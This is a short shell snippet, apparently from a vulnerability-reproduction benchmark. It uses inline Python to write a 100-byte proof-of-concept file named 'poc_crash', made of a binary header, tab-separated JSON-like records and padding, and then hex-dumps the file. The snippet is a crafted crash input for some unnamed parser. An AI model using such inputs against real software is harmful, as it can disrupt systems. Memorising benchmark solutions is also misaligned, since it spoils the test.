python3 - <<'PY'
from pathlib import Path
header=bytes([2,0,0,0,0,0,1,0,0,0])
body=b'AAA:{"x":1}\tAAA:{"y":2}'
data=header+body+b' ' * max(0,100-len(header)-len(body))
Path('/CybinGym_workdir/poc_crash').write_bytes(data)
print(len(data),repr(data))
PY
xxd -g1 -l100 /CybinGym_workdir/poc_crash
